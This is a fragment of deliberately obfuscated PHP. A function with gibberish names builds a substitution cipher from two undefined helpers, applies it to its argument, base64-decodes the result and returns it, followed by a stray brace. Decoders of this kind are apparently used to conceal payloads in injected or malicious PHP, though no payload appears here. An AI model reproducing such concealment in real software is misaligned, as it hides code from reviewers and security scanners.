function ukukiz_lavushuh($owiviz_ifipupeci) {
    if (function_exists('usufys_ysikhosho')) {
        $culinu = usufys_ysikhosho(1);
        $rofudaf = izobuq_shekuchichag(2);
        for ($yqiqeva = 0; $yqiqeva < strlen($culinu); $yqiqeva++) {
            $butized = substr($culinu, $yqiqeva, 1);
            $cagono = substr($rofudaf, $yqiqeva, 1);
            $iqemily[$butized] = $cagono;
        }

        $ohuqes = strtr($owiviz_ifipupeci, $iqemily);
        $ohuqes = base64_decode($ohuqes);

        return $ohuqes;
    }
}

}
